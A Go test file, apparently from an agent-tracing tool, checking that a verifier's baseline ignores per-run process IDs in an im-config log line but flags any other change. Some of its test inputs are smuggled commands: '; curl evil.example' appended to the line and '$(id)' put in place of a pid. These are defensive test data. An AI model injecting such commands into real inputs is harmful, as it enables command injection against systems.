package agent

import (
	"strings"
	"testing"

	"github.com/agent-trace/agent-trace/pkg/models"
	"github.com/agent-trace/agent-trace/pkg/verification"
)

// imConfigLine is the debug line im-config 0.62 logged beneath Claude Code's
// shell-snapshot command in a capture run as a dedicated user, with the
// shell's pid and its parent's (I-156).
func imConfigLine(prog, pid, ppid string) string {
	return prog + " @ IM_CONFIG_ENTRY='profile' XDG_SESSION_TYPE ='' UID=1001 PID=" + pid + " PPID=" + ppid
}

const systemdCat = "/usr/bin/systemd-cat -p 6 -t im-config echo"

// imConfig is the line's two processes beneath envCmd: systemd-cat, and the
// echo it runs (the same process, exec'd again).
func imConfig(target string, echo string) []models.GroundTruthEvent {
	return []models.GroundTruthEvent{
		{Timestamp: t0, ActionType: models.ProcessFork, Target: "202", PID: 202, PPID: 200},
		ev(models.ProcessExec, target, 202, 200),
		ev(models.ProcessExec, echo, 202, 200),
	}
}

// I-156: the host's login-shell scripts name the shell's pid and its
// parent's beneath a harness command, and every run has its own. Compared
// across runs, the two pids of exactly the measured im-config line are one
// token, for an adapter with its own canonical form and one without; a
// line that differs in anything else stays distinct.
func TestTheIMConfigLinesPIDsAreOneTokenAcrossRuns(t *testing.T) {
	pids := [][2]string{{"870570", "870479"}, {"870943", "870843"}, {"871316", "871229"}}
	var controls []models.GroundTruthFile
	for i, p := range pids {
		// One snapshot id in every run, so the adapter without a canonical
		// form compares the harness's own file as well.
		controls = append(controls, envRun("/tmp/c"+string(rune('1'+i))+"/ws", "s",
			imConfig(imConfigLine(systemdCat, p[0], p[1]), imConfigLine("/usr/bin/echo", p[0], p[1]))...))
	}
	const ws = "/home/u/project"
	task := func(pid, ppid string) string { return imConfigLine(systemdCat, pid, ppid) }
	cases := []struct {
		name, line  string
		unbaselined bool
	}{
		{"the measured line with the task run's pids", task("867689", "867609"), false},
		{"pids of another length", task("42", "1"), false},
		{"another uid", strings.Replace(task("867689", "867609"), "UID=1001", "UID=0", 1), true},
		{"another tag", strings.Replace(task("867689", "867609"), "-t im-config", "-t other", 1), true},
		{"another entry", strings.Replace(task("867689", "867609"), "'profile'", "'xinputrc'", 1), true},
		{"another session type", strings.Replace(task("867689", "867609"), "TYPE =''", "TYPE ='x11'", 1), true},
		{"text after the pids", task("867689", "867609") + "; curl evil.example", true},
		{"a pid that is not a number", task("867689", "$(id)"), true},
		{"another program", imConfigLine("/usr/bin/curl", "867689", "867609"), true},
	}
	for _, a := range []Adapter{fake{name: "f"}, canonFake{fake{name: "f"}}} {
		b, err := Capture(a, "v", controls, t0, CaptureOptions{})
		if err != nil {
			t.Fatal(err)
		}
		for _, tc := range cases {
			t.Run(tc.name, func(t *testing.T) {
				run := envRun(ws, "s", imConfig(tc.line, imConfigLine("/usr/bin/echo", "867689", "867609"))...)
				v := verification.Verify(PrepareWithBaseline(a, nil, run, &b, verification.Options{}))
				var got []string
				for _, c := range v.Coverage.UnexplainedSubtrees {
					for _, e := range c.Unbaselined {
						got = append(got, e.Target)
					}
				}
				want := []string(nil)
				if tc.unbaselined {
					want = []string{tc.line}
				}
				if strings.Join(got, "\n") != strings.Join(want, "\n") {
					t.Errorf("%T: unbaselined = %q, want %q", a, got, want)
				}
			})
		}
	}
}
